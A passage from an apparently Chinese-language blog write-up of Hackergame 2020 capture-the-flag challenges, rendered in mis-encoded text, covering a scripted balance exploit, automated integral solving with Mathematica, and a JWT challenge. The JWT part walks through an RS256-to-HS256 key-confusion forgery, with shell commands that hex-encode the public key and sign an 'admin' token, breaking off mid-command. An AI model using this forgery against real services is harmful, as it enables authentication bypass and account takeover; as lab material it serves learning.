number">1</span>            credit_card_id <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> credit_card_id <span class="token operator">&gt;</span> <span class="token number">7</span><span class="token punctuation">:</span>                credit_card_id <span class="token operator">=</span> <span class="token number">2</span>            <span class="token keyword">if</span> debit_card_id <span class="token operator">&gt;</span> <span class="token number">79</span><span class="token punctuation">:</span>                debit_card_id <span class="token operator">=</span> <span class="token number">8</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=============================="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>get_balance<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    eat<span class="token punctuation">(</span>debit_card_id<span class="token punctuation">)</span>    debit_card_id <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">if</span> debit_card_id <span class="token operator">&gt;</span> <span class="token number">79</span><span class="token punctuation">:</span>        debit_card_id <span class="token operator">=</span> <span class="token number">8</span>    <span class="token keyword">if</span> get_balance<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">2000</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>get_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><p>è·‘äº†è´¼ä¹…ï¼Œç»ˆäºå¾—åˆ° flag äº†ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102172850413.png" alt="flag"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102172637058.png" alt="flag"></p><hr><h2 id="è¶…åŸºç¡€çš„æ•°ç†æ¨¡æ‹Ÿå™¨"><a href="#è¶…åŸºç¡€çš„æ•°ç†æ¨¡æ‹Ÿå™¨" class="headerlink" title="è¶…åŸºç¡€çš„æ•°ç†æ¨¡æ‹Ÿå™¨"></a>è¶…åŸºç¡€çš„æ•°ç†æ¨¡æ‹Ÿå™¨</h2><p><em>ï¼ˆå¤ç°ï¼‰</em></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108021733621.png" alt="é¢˜ç›®"></p><p>è¿™é¢˜éœ€è¦æœ‰å¾ˆæ‰å®çš„æ•°ç†åŸºç¡€æ‰è¡Œâ€¦â€¦ï¼ˆåºŸè¯</p><p>ç¬¬ä¸€ç§è§£æ³•æ˜¯æ‰‹ç®—æˆ–è€…ç›´æ¥æŒ‰è®¡ç®—å™¨ï¼Œä½†æˆ‘æŒ‰äº†å‡ é¢˜æ”¾å¼ƒäº†ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108024803778.png" alt="æ­£ç¡®çš„æç¤º"></p><p>å¦å¤–ä¸€ç§æ˜¯å€ŸåŠ©ç½‘ç»œä¸Šå…¬å¼€çš„è®¡ç®—å™¨ï¼Œå‡†å¤‡çˆ¬ä¸ªæ¥å£æˆ–è€…è‡ªå·±æ„é€ ä¸€ä¸ªæ¥å£æ¥ç”¨ï¼Œæœéäº†å‘ç°æœ‰å‡ ä¸ª<strong>å¯èƒ½å¯ä»¥ç”¨çš„</strong>ï¼š</p><ul><li><a href="https://zs.symbolab.com/solver/step-by-step/">ä¸€æ­¥æ­¥è§£çš„è®¡ç®—å™¨ symbolab</a></li><li><a href="https://zh.numberempire.com/definiteintegralcalculator.php">å®šç§¯åˆ†è®¡ç®—å™¨</a></li><li><a href="https://www.wolframalpha.com/">WolframAlpha</a></li><li>etc.</li></ul><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108022303182.png" alt="é¢˜ç›®æºä»£ç "></p><p>ç„¶è€Œå‘ç°éƒ½<strong>ä¸èƒ½ç›´æ¥è§£æ</strong>é¢˜ç›®æ‰€ç»™çš„ LaTeXï¼Œæˆ–è€…<strong>è§£ä¸å‡ºæ¥</strong>ï¼Œå†æˆ–è€…è§£å‡ºæ¥çš„è¯<strong>ç²¾åº¦ä¹Ÿä¸å¤Ÿ</strong>â€¦â€¦</p><p>è¿˜æœ‰ä¸€ç§æ–¹æ¡ˆï¼Œæ˜¯è°ƒç”¨æœ¬åœ°çš„æœåŠ¡è§£æ LaTeXï¼Œå†è¿›è¡Œç§¯åˆ†è¿ç®—ã€‚</p><p>äºæ˜¯æƒ³åˆ°äº†æŸçº¢è‰²è½¯ä»¶ï¼ŒMathematicaï¼Œåˆç§° MMAã€‚</p><p>æ—©å°±å¬è¯´è¿™ç©æ„ç¬¦å·è®¡ç®—è´¼å‰å®³äº†ï¼Œè™½ç„¶ä¹‹å‰ä¹Ÿæ²¡ç”¨è¿‡ï¼Œè¿˜æ˜¯æ¯”èµ›ç°è£…ç°å­¦çš„ï¼Œä½†ç”¨äº†å°±å‘ç°çœŸçš„å¼ºï¼Œå¤ªé¦™äº†ï¼Œ<del>æ—©çŸ¥é“ç”¨æ¥è§£é«˜æ•°é‡Œçš„å¾®ç§¯åˆ†é¢˜å¤šå¥½</del>ã€‚</p><p>æœäº†æœå‘ç° MMA æ”¯æŒè§£æ LaTeX è¡¨è¾¾å¼ï¼Œå¤ªå¥½äº†ï¼</p><p>åŸç†å°±æ˜¯ç”¨ Python çš„ requests åº“æŠŠé¢˜ç›®ç½‘é¡µçˆ¬ä¸‹æ¥ï¼Œç”¨ Beautifulsoup è§£æå¾—åˆ° LaTeX å…¬å¼ï¼Œè°ƒç”¨ MMA è§£æè¡¨è¾¾å¼å¹¶è¿›è¡Œç§¯åˆ†è¿ç®—ï¼Œæœ€åç”¨ requests æäº¤ç­”æ¡ˆï¼Œåšä¸€ä¸ªå¾ªç¯è§£ä¸ª400é¢˜å°±å®Œäº‹äº†ã€‚</p><p>å‚è€ƒ <a href="https://reference.wolfram.com/language/tutorial/ImportingAndExporting.html#32618">Wolfram å®˜æ–¹æ–‡æ¡£ ç”Ÿæˆå’Œå¯¼å…¥ TeX</a>ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„è¯­å¥å°† LaTeX è½¬æ¢ä¸º MMA çš„è¡¨è¾¾å¼ã€‚</p><pre class="language-mathematica" data-language="mathematica"><code class="language-mathematica">ToExpression["input",TeXForm]</code></pre><p>ä½†ç”±äº MMA ä¸æ”¯æŒè¿™ä¸ªé¢˜ç›®ç»™çš„è¿™ä¸ª LaTeX æ ¼å¼ï¼Œéœ€è¦æŠŠç§¯åˆ†ä¸Šä¸‹é™æå–å‡ºæ¥ï¼Œæœ€åçš„ <code>{d x}</code> ä¹Ÿè¦æ›¿æ¢ä¸º <code>dx</code>ï¼Œæ‰€æœ‰çš„å•æ–œæ  <code>\</code> è¦æ›¿æ¢ä¸ºåŒæ–œæ  <code>\\</code>ï¼Œç§¯åˆ†è¡¨è¾¾å¼ä¹Ÿè¦ç”¨ <code>\\left(</code> <code>\\right)</code> åŒ…å«èµ·æ¥ã€‚</p><p>å¥½äº†ï¼Œç°åœ¨åœ¨ MMA é‡Œè°ƒå¥½èƒ½è§£æ LaTeX å¹¶ç§¯åˆ†äº†ï¼Œä¸‹é¢æ¥æ•´å’Œ Python çš„æ¥å£ã€‚</p><p>å‚è€ƒ <a href="https://reference.wolfram.com/language/WolframClientForPython/index.html">wolfram å®˜æ–¹æ–‡æ¡£ Wolfram Client Library for Python</a>ï¼Œå®˜æ–¹æä¾›äº†ä¸€ä¸ªå®¢æˆ·ç«¯è¿›è¡Œäº¤äº’ï¼Œä¹Ÿå¯ä»¥åœ¨ MMA é‡Œè°ƒç”¨ Python æ‰§è¡Œã€‚</p><p>ç„¶è€Œï¼å…¶ä»–éƒ½èƒ½ç”¨ï¼Œä¸€æŠŠä¸Šè¿°è°ƒå¥½çš„è§£æ LaTeX çš„ä»£ç ç”¨è¿™ä¸ª client æ‰§è¡Œï¼Œç»ˆç«¯å°±å¡æ­»äº†ï¼Œå•¥ååº”æ²¡æœ‰ï¼Œäººå‚»äº†ã€‚è¯•äº†å¥½ä¹…ä¸çŸ¥é“æ˜¯æˆ‘å†™çš„é—®é¢˜è¿˜æ˜¯ä»–æœ¬èº«çš„é—®é¢˜äº†ã€‚ã€‚</p><p>æœ€åå®åœ¨ä¸è¡Œï¼Œæ”¹ç”¨å‘½ä»¤è¡Œæ‰§è¡Œï¼Œå¯ä»¥è°ƒç”¨å®‰è£…ç›®å½•ä¸‹çš„ <code>wolframscript -code &lt;CodeHere&gt;</code> æ¥æ‰§è¡Œä»£ç ã€‚å°±ç±»ä¼¼äº Python çš„ <code>python3 -c &lt;CodeHere&gt;</code> ç”¨æ³•ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108023824075.png" alt="directory"></p><p>ç„¶è€Œå‘ç°ä¹Ÿä¸è¡Œï¼Œå¯èƒ½ç”±äºå¼•å·å’Œ<code>[ ]</code>çš„é—®é¢˜è¯­æ³•ä¸å¯¹æ‰§è¡Œå¤±è´¥äº†ã€‚</p><p>æœ€åæ²¡åŠæ³•äº†ï¼Œå¹²è„†ç›´æ¥è·‘ä¸ªç»ˆç«¯å§ã€‚</p><p>å‚è€ƒ <a href="https://blog.csdn.net/Hongkun_419/article/details/103767479">windowsä¸‹python3å¦‚ä½•è°ƒç”¨mathematicaè¿›è¡Œé«˜çº§è®¡ç®—</a> è¿™ä¸€ç¯‡ï¼Œç”¨ winpexpect æ¥è¿›è¡Œäº¤äº’å¼æ“ä½œã€‚</p><p>ï¼ˆå‘ç°æœ‰å¤§å¸ˆå‚…ç›´æ¥ç”¨ pwntools è¿›è¡Œäº¤äº’ï¼Œå…¶å®ä¹Ÿè¡Œ 2333.</p><p>å…·ä½“ç°åœ¨ä¸€ä¼šå„¿è¿˜è¯´ä¸æ¸…æ¥šï¼Œåé¢ä¸“é—¨å†™ä¸€ç¯‡è®²è¿™ä¸ªäº¤äº’çš„å§ï¼Œ<del>ä»£ç è¿˜æ²¡ä¼˜åŒ–å¥½ï¼Œç»ˆç«¯è¶…æ—¶è¿˜æ²¡å¤„ç†å¥½ä»¥è‡³äºä¼šå¼€ä¸€å †ç»ˆç«¯â€¦â€¦</del></p><p>åæ­£å°±è°ƒç”¨ MMA å»è®¡ç®—ï¼Œç„¶åè¾“å‡ºç»“æœè¯»è¿›æ¥ï¼Œè°ƒç”¨ <code>/submit</code> æ¥å£æäº¤ç­”æ¡ˆã€‚</p><p>å¥½ä¸å®¹æ˜“åˆ°è¿™ä¸€æ­¥éƒ½å·®ä¸å¤šäº†ï¼Œå¿ƒæ€å·²ç»ç‚¸çš„ä¸è¡Œäº†ï¼ˆå·²ç»è°ƒäº†ä¸€ä¸‹åˆäº†ï¼‰ã€‚ç»“æœå‘ç°æ€ä¹ˆä¸€ç›´å¡åœ¨ 399 é¢˜ä¸‹ä¸å»ï¼Ÿï¼Ÿï¼Ÿ</p><p>å¼€å§‹æ€€ç–‘æˆ‘ POST è¯·æ±‚å‚æ•°æ˜¯ä¸æ˜¯ä¸å¯¹ï¼Œé¢˜ç›®éœ€è¦çš„æ˜¯ <code>x-www-form-urlencoded</code>ï¼Œéš¾ä¸æˆæ•´äº† <code>form-data</code> æˆ–è€…å…¶ä»–çš„ï¼Ÿ</p><p>ç”¨ <a href="http://httpbin.org/">httpbin</a> è¯•äº†è¯•ï¼Œåˆåœ¨ VPS ä¸Šæ­äº†ä¸ªæ¥å£æ¥æ”¶è¯•äº†è¯•ï¼Œæ²¡æ¯›ç—…å•Šâ€¦â€¦</p><p>å†çœ‹ä»£ç ï¼Œéš¾ä¸æˆ cookie ç‚¸äº†ã€‚å†™äº†æŒºå¤šçˆ¬è™«äº†ï¼Œä¸€èˆ¬éƒ½ç”¨ <code>requests.Session()</code> ç»´æŒ Cookie çŠ¶æ€ï¼Œä¹‹å‰ä¹Ÿæ²¡ç¢°åˆ°ç‚¸çš„ï¼Œä¸ä¼šè¿™é‡Œåæ‰å§ã€‚</p><p>å†å»ç ”ç©¶äº†äº¿æ¬¡æäº¤è¿‡ç¨‹ï¼Œå‘ç° POST ä¼šå¸¦ä¸Šæ­¤æ—¶çš„ Cookieï¼Œè¿”å›ä¸€ä¸ª302è·³è½¬ï¼ŒåŒæ—¶ Set-Cookieï¼Œè·³è½¬ä¹‹å GET æ–¹æ³•å¸¦ä¸Šæ–°çš„ Cookie å»è®¿é—®æ ¹ç›®å½•ï¼Œå¾—åˆ°è¿”å›çš„åŒæ—¶åˆè®¾ç½®äº†æ–°çš„ Cookieã€‚</p><p>æ‰‹åŠ¨ç”¨ Postman æ¨¡æ‹Ÿäº†ä¸€ä¸‹ï¼Œå¦‚æœï¼ˆè·Ÿéš 302 è·³è½¬ï¼‰ä¸åŠæ—¶æ›´æ–° Cookie çš„è¯ï¼Œç¡®å®ä¼šä¸€ç›´å¡åœ¨ä¹‹å‰çš„çŠ¶æ€ï¼Œç”šè‡³è¿ <code>ç­”æ¡ˆæ­£ç¡®</code>ã€<code>ç­”æ¡ˆé”™è¯¯</code>ä¹‹ç±»çš„è¯éƒ½ä¸€æ¨¡ä¸€æ ·ï¼Œè¿˜éœ€è§£ç­”çš„é¢˜ç›®æ•°é‡ä¹Ÿä¸å˜ï¼Œå¤ªè‰äº†ï¼</p><p><strong>äºæ˜¯æ¯”èµ›çš„æ—¶å€™å°±å¡è¿™é‡Œäº†ã€‚åˆè°ƒäº†ä¸€æ™šä¸Šå¿ƒæ€å½»åº•ç‚¸äº†ã€‚ã€‚</strong>  <em><del>ï¼ˆåæ¥å°±æ²¡æ‰“äº†</del></em></p><p><del>ç°åœ¨æƒ³æƒ³åº”è¯¥æ˜¯æˆ‘æŠŠåˆå§‹çš„ <code>Cookie</code> å†™åˆ°äº† <code>Headers</code> é‡Œçš„åŸå› å§ï¼Œåé¢å•ç‹¬è®¾ç½® cookieï¼Œæ…¢æ…¢ä¼˜åŒ–ä»£ç å†è¯•è¯•ã€‚</del></p><blockquote><p><strong>20201109 Update:</strong></p><p>ä¼˜åŒ–äº†äº¿ä¸‹ï¼Œç°åœ¨å·®ä¸å¤šäº†ï¼Œèƒ½æµç•…æ±‚è§£äº†ï¼Œåé¢ä¸“é—¨å†™ä¸€ç¯‡è®²è®² Python å’Œ MMA äº¤äº’çš„ã€‚ <em>ï¼ˆç•™å‘ï¼‰</em></p><p>å…ˆç®€å•è¯´ä¸€è¯´å§ã€‚</p><p><strong>å‚è€ƒ Mathematica è®¡ç®—å¼ï¼š</strong></p><pre class="language-mathematica" data-language="mathematica"><code class="language-mathematica">NIntegrate[ToExpression["\\sqrt{x} + \\frac{5}{x} + \\ln\\left(x\\right) + \\sin\\left(\\ln\\left(x\\right)\\right)",TeXForm],{x,ToExpression["\\frac{2}{3}",TeXForm],ToExpression["\\frac{4}{3}",TeXForm]},WorkingPrecision-&gt;12]</code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201109012506678.png" alt="MMAç¤ºä¾‹"></p><p>ä¹‹å‰è¯•äº†ç›´æ¥ç”¨ <code>ToExpression</code> æŠŠåŒ…å« <code>\\int_{}^{}</code> çš„ç§¯åˆ†è¡¨è¾¾å¼å…¨éƒ¨å†™è¿›å»ï¼Œä½†å‘ç°è®¡ç®—é€Ÿåº¦ç‰¹åˆ«æ…¢ï¼Œç”šè‡³ä¼šå¡æ­»ï¼Œè€Œä¸”ç»“æœä¹Ÿä¸å¯¹ã€‚</p><p>è¿˜æ˜¯å•ç‹¬æŠŠè¢«ç§¯è¡¨è¾¾å¼ã€ä¸Šä¸‹é™æå–å‡ºæ¥ï¼Œç”¨è‡ªå¸¦çš„ <code>NIntegrate</code> ç§¯åˆ†æ±‚è§£ï¼Œé¡ºä¾¿æŒ‡å®šç²¾åº¦æ¥çš„å®åœ¨ã€‚</p><p>å¦å¤–ï¼Œè¿™ä¸ªé¢˜ç›®å¡åœ¨ 399 é¢˜ä¸‹ä¸å»çš„åŸå› åº”è¯¥æ˜¯åˆå§‹æ—¶å€™çš„ Cookie è®¾ç½®ä¸å¯¹ï¼Œåœ¨302è·³è½¬çš„è®¾ç½®ä¸Šï¼Œç»æµ‹è¯•ï¼Œ<code>allow_redirects</code> æ— è®ºæ˜¯ True æˆ–è€… Falseï¼ŒCookie éƒ½èƒ½æ­£ç¡®æ›´æ–°ï¼Œä¹Ÿå°±æ˜¯è¯´ç”¨ <code>requests.Session()</code> æ¥ç»´æŒ Cookie çŠ¶æ€æ˜¯æ²¡é—®é¢˜çš„ã€‚</p><p>åœ¨<strong>æœ€å¼€å§‹çš„æ—¶å€™åŠ ä¸Šä¸€ä¸ªç™»å½•ï¼ŒæŠŠè‡ªå·±çš„ token å¸¦ä¸Š</strong>å°±èƒ½è§£å†³é—®é¢˜äº†ï¼Œä¸<code>allow_redirects</code> è®¾ç½®æ— å…³ã€‚è¿™é¢˜ç”šè‡³è¿ headers éƒ½ä¸éœ€è¦è®¾ç½®ã€‚</p><p>å‚è€ƒä»£ç å¦‚ä¸‹ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote_plus<span class="token keyword">import</span> requestssession <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>token <span class="token operator">=</span> <span class="token string">'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'</span>resp <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span> <span class="token string-interpolation"><span class="token string">f"http://202.38.93.111:10190/login?token=</span><span class="token interpolation"><span class="token punctuation">{</span>quote_plus<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token comment"># ...</span></code></pre></blockquote><blockquote><p>çœ‹äº†å®˜æ–¹ WP å‘ç° Python é‡Œçš„ sympy åº“å±…ç„¶è‡ªå¸¦æœ‰è§£æ LaTeX çš„ï¼Œå®³ï¼Œè¿˜æ˜¯å¤ªèœäº†ã€‚</p></blockquote><hr><h2 id="æ™®é€šçš„èº«ä»½è®¤è¯å™¨"><a href="#æ™®é€šçš„èº«ä»½è®¤è¯å™¨" class="headerlink" title="æ™®é€šçš„èº«ä»½è®¤è¯å™¨"></a>æ™®é€šçš„èº«ä»½è®¤è¯å™¨</h2><blockquote><p>è¿‘æ—¥ï¼Œå° T æ¥æ‰‹äº†æŸä¸ªè€æ—§ Python ç½‘ç«™çš„é‡æ„å·¥ä½œã€‚æ¥æ‰‹ä¹‹åï¼Œä»–æŠŠåŸå…ˆçš„ requirements.txt  å¤åˆ¶åˆ°äº†æ–°é¡¹ç›®ä¸‹ï¼Œæ›´æ¢äº†åç«¯æ¡†æ¶ï¼Œç…§ç€æ¡†æ¶æ–‡æ¡£é­”æ”¹äº†èº«ä»½è®¤è¯éƒ¨åˆ†çš„å†…å®¹ï¼Œå†™å‡ºäº†ä¸€ä¸ªæµ‹è¯•ç”¨çš„åŸå‹ã€‚çœ‹èµ·æ¥ä¸€åˆ‡éƒ½å¾ˆæ­£å¸¸ï¼Œåªæ˜¯ä»–ä¼¼ä¹æ²¡æœ‰ä»”ç»†æ£€æŸ¥æ¯ä¸€é¡¹ä¾èµ–çš„ç‰ˆæœ¬ã€‚</p><p>ã€Œæ‡’å¾—ç®¡äº†ï¼Œåˆä¸æ˜¯ä¸èƒ½ç”¨ï¼ã€ä½†æœçœŸå¦‚æ­¤å—ï¼Ÿ</p></blockquote><p>ç™»å½•åä¼šè¿”å›ä¸€ä¸ª <code>access_token</code>ï¼Œbase64 è§£ç ä¸€ä¸‹å¾ˆæ˜æ˜¾æ˜¯ JWTã€‚å½“ç„¶ JavaScript ä»£ç é‡Œé€»è¾‘ä¹Ÿå¾ˆæ˜æ˜¾äº†ã€‚</p><pre class="language-none"><code class="language-none">{"typ":"JWT","alg":"RS256"}.{"sub":"guest","exp":1604399671}.........</code></pre><blockquote><p>ä¸€ä¸ª JWT å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š<strong>å¤´éƒ¨ Headerã€è½½è· Payload ä¸ç­¾å Signature</strong>ã€‚å°†è¿™ä¸‰æ®µä¿¡æ¯æ–‡æœ¬ç”¨.é“¾æ¥ä¸€èµ·å°±æ„æˆäº† JWT å­—ç¬¦ä¸²ã€‚</p><p>å‚è€ƒå®˜ç½‘ <a href="https://jwt.io/">https://jwt.io/</a></p><p>ä»¥åŠ é˜®ä¸€å³°çš„ <a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">JSON Web Token å…¥é—¨æ•™ç¨‹</a></p></blockquote><p>å†ç‚¹å‡» <code>è·å–ç”¨æˆ·ä¿¡æ¯</code> æ—¶æŠŠè¿™ä¸ª jwt æ”¾åˆ° è¯·æ±‚å¤´çš„ <code>Authorization</code> å‚æ•°é‡Œï¼ŒåŒæ—¶ä¹Ÿå¸¦ä¸Š <code>Hg-Token</code> å³ä½ è‡ªå·± hackergame çš„ tokenã€‚</p><p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œèº«ä»½è®¤è¯çš„ç‰ˆæœ¬ä¸Šæœ‰æ¼æ´ï¼ŒæŸ¥äº†ä¸€ä¸‹ã€‚</p><p>å‚è€ƒ <a href="https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/">JWT Attack Walk-Through</a> ä¸€æ–‡ã€‚</p><blockquote><p>Thereâ€™s a well-known defect [1] with older versions of certain libraries where you can trick a JSON Web Token (JWT) consumer that expects tokens signed using <em>asymmetric</em> cryptography into accepting a <em>symmetrically</em> signed token. This article assumes youâ€™re comfortable with JWTs and the theory of this attack, but the nub of it is that by <strong>switching the token algorithm from â€˜RSâ€™ to â€˜HSâ€™, a vulnerable endpoint will use its public  key to verify the token in a symmetric way</strong> (and being public, that key isnâ€™t much of a secret).</p></blockquote><p>ç®€å•çš„è¯´å°±æ˜¯æŠŠ RS -&gt; HSï¼Œè€Œååç«¯å°±ç”¨å…¬é’¥å»éªŒè¯ tokenã€‚</p><p>å¦å¤–æ ¹æ® HTML é‡Œçš„æç¤ºï¼Œç³»ç»Ÿç”¨äº† FastAPI, Axios and Vue.jsã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103182611421.png" alt="html"></p><p>å…¶ä¸­ <a href="https://fastapi.tiangolo.com/zh/#api">FastAPI è‡ªèº«å¸¦æœ‰ API æ–‡æ¡£</a>ã€‚</p><p>åœ¨è¿™é¢˜ä¸­å°±æ˜¯ <a href="http://202.38.93.111:10092/docs">http://202.38.93.111:10092/docs</a> ä»¥åŠ <a href="http://202.38.93.111:10092/redoc">http://202.38.93.111:10092/redoc</a></p><p>å‘ç°æœ‰ä¸€ä¸ª <code>POST /debug</code> çš„æ¥å£ï¼Œè¯·æ±‚ä¸€ä¸‹è¯•è¯•ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103184932948.png" alt="debug API"></p><p>æ­£å¥½åˆé€‚ï¼Œè¿™åº”è¯¥å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„å…¬é’¥äº†ã€‚</p><pre class="language-none"><code class="language-none">-----BEGIN RSA PUBLIC KEY-----MIICCgKCAgEAn/KiHQ+/zwE7kY/Xf89PY6SowSb7CUk2b+lSVqC9u+R4BaE/5tNFeNlneGNny6fQhCRA+Pdw1UJSnNpG26z/uOK8+H7fMb2Da5t/94wavw410sCKVbvfft8gKquUaeq//tp20BETeS5MWIXp5EXCE+lEdAHgmWWoMVMIOXwaKTMnCVGJ2SRr+xH9147FZqOa/17PYIIHuUDlfeGi+Iu7T6a+QZ0tvmHL6j9Onk/EEONuUDfElonYM688jhuAM/FSLfMzdyk23mJk3CKPah48nzVmb1YRyfBWiVFGYQqMCBnWgoGOanpd46Fp1ff1zBn4sZTfPSOus/+00D5Lxh6bsbRa6A1vAApfmTcu026lIb7gbG7DU1/seDId9s1qA5BJpzWFKO4ztkPGvPTUok8hQBMDaSH1JOoFQgfJIfC7w2CQe+KbodQL3akKQDCZhcoA4tf5VC6ODJpFxCn6blML5cD6veOBPJiIk8DBRgmt2AHzOUju+5nsQcplOVxW5TFYxLqeJ8FPWqQcVekZ749FjchtAwPlUsoWIH0PTSun38ua8usrwTXbpBlf4r0wz22FPqaecvp7z6Rj/xfDauDGDSU4hmn/TY9Fr+OmFJPW/9k2RAv7KEFvFCLP/3U3r0FMwSe/FPHmt5fjAtsGlZLj+bZsgwFllYeD90VQU8Ds+KkCAwEAAQ==-----END RSA PUBLIC KEY-----</code></pre><p>æŠŠå…¬é’¥ä¿å­˜å¸¦ <code>key.pem</code> æ–‡ä»¶ä¸­ã€‚</p><p>è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œ<strong>æ¢è¡Œç”¨çš„æ˜¯ <code>\n</code>**ï¼Œå³åå…­è¿›åˆ¶çš„ <code>0A</code>ï¼Œè€Œä¸æ˜¯ <code>\r\n</code> (<code>0D0A</code>)ã€‚ä¸”</strong>æœ€æœ«å°¾æœ‰ <code>\n</code>**ã€‚</p><p>è½¬åå…­è¿›åˆ¶ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> key.pem <span class="token operator">|</span> xxd -p <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">"<span class="token entity" title="\\">\\</span>n"</span>2d2d2d2d2d424547494e20525341205055424c4943204b45592d2d2d2d2d0a4d49494343674b43416745416e2f4b6948512b2f7a7745376b592f58663839505936536f7753623743556b32622b6c5356714339752b52344261452f35744e460a654e6c6e65474e6e79366651684352412b50647731554a536e4e704732367a2f754f4b382b4837664d6232446135742f39347761767734313073434b566276660a667438674b7175556165712f2f747032304245546553354d5749587035455843452b6c45644148676d57576f4d564d494f5877614b544d6e4356474a325352720a2b784839313437465a714f612f313750594949487555446c666547692b4975375436612b515a3074766d484c366a394f6e6b2f45454f4e75554466456c6f6e590a4d3638386a6875414d2f46534c664d7a64796b32336d4a6b33434b50616834386e7a566d6231595279664257695646475951714d43426e57676f474f616e70640a34364670316666317a426e34735a546650534f75732f2b303044354c786836627362526136413176414170666d5463753032366c496237676247374455312f730a65444964397331714135424a707a57464b4f347a746b5047765054556f6b386851424d44615348314a4f6f465167664a4966433777324351652b4b626f64514c0a33616b4b5144435a68636f41347466355643364f444a704678436e36626c4d4c3563443676654f42504a69496b38444252676d743241487a4f556a752b356e730a5163706c4f56785735544659784c71654a3846505771516356656b5a373439466a6368744177506c55736f57494830505453756e3338756138757372775458620a70426c66347230777a32324650716165637670377a36526a2f7866446175444744535534686d6e2f54593946722b4f6d464a50572f396b32524176374b4546760a46434c502f3355337230464d7753652f4650486d7435666a417473476c5a4c6a2b625a736777466c6c59654439305651553844732b4b6b434177454141513d3d0a2d2d2d2d2d454e4420525341205055424c4943204b45592d2d2d2d2d0a</code></pre><p>Payload é‡Œ</p><p>åŠ å¯†ç®—æ³•ç”± <code>RS256</code> é™çº§ä¸º <code>HS256</code>ï¼Œå†æ ¹æ®é¢˜ç›®è¦æ±‚ï¼Œéœ€è¦æŠŠ <code>guest</code> æ”¹æˆ <code>admin</code>.</p><pre class="language-none"><code class="language-none">{"typ":"JWT","alg":"HS256"}.{"sub":"admin","exp":1604399671}</code></pre><p>base64 ç¼–ç ä¸€ä¸‹ï¼Œä¸”å»æ‰ç»“å°¾çš„ <code>=</code>ï¼Œæ³¨æ„ä¸è¦ä¸¢æ‰ä¸­é—´çš„ <code>.</code>ã€‚</p><pre class="language-none"><code class="language-none">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNDM5OTY3MX0</code></pre><p>ä¸‹é¢å¼€å§‹ç®—åŠ å¯†æ‰€ç”¨çš„<strong>ç­¾åï¼ˆSignatureï¼‰</strong>ã€‚</p><p>æŠŠä¸Šé¢å¾—åˆ°çš„è¯ä¹¦åŠ è½½è¿›æ¥ï¼Œç”¨ä»–æ¥åŠ å¯†ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> -n <span class="token string">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNDM5OTY3MX0"</span> <span class="token operator">|</span> openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20525341205055424c4943204b45592d2d2d2d2d0a4d49494343674b43416745416e2f4b6948512b2f7a7745376b592f58663839505936536f7753623743556b32622b6c5356714339752b52344261452f35744e460a654e6c6e65474e6e79366651684352412b50647731554a536e4e704732367a2f754f4b382b4837664d6232446135742f39347761767734313073434b566276660a667438674b7175556165712f2f747032304245546553354d5749587035455843452b6c45644148676d57576f4d564d494f5877614b544d6e4356474a325352720a2b784839313437465a714f612f313750594949487555446c666547692b4975375436612b515a3074766d484c366a394f6e6b2f45454f4e75554466456c6f6e590a4d3638386a6875414d2f46534c664d7a64796b32336d4a6b33434b50616834386e7a566d6231595279664257695646475951714d43426e57676f474f616e70640a34364670316666317a426e34735a546650534f75732f2b303044354c786836627362526136413176414170666d5463753032366c496237676247374455312f730a65444964397331714135424a707a57464b4f347a746b5047765054556f6b386851424d44615348314a4f6f465167664a4966433777324351652b4b626f64514c0a33616b4b5144435a68636f41347466355643364f444a704678436e36626c4d4c3563443676654f42504a69496b38444252676d743241487a4f556a752b356e730a5163706c4f56785735544659784c71654a3846505771516356656b5a373439466a6368744177506c55736f57494830505453756e3338756138757372775458620a70426c66347230777a32324650716165637670377a36526a2f7866446175444744535534686d6e2f54593946722b4f6d464a50572f396b32524176374b